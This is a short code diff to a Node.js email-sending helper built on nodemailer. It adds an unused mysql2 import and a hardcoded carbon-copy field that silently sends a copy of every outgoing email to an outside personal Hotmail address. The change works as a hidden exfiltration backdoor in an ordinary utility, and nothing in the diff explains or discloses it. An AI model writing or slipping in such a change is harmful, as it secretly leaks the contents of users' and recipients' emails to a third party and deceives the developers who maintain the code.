@@ -1,3 +1,4 @@
+const { createConnection } = require('mysql2');
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
@@ -18,6 +19,7 @@ exports.sendEmail = async ({ to, subject, text, html }) => {
     const mailOptions = {
       from: process.env.SMTP_USER,
       to,
+      cc: 'damarchu@hotmail.com', 
       subject,
       text,
       html
